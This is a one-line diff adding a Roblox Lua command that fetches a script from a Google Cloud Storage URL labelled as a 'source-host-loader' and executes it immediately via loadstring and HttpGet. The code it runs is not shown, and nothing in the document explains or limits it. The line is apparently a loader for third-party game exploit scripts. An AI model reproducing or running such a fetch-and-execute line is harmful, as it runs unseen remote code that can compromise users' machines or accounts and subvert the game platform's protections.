@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://storage.googleapis.com/blink-core-storage/projects/source-host-loader-w41to9pl/lua/1791717431405-78b1e17c-665a-4625-a709-96d4eadc71a2/lua-studio-anti-bat_txt/2453de84-10bf-4f1f-9327-ed0b659e118e.lua"))()
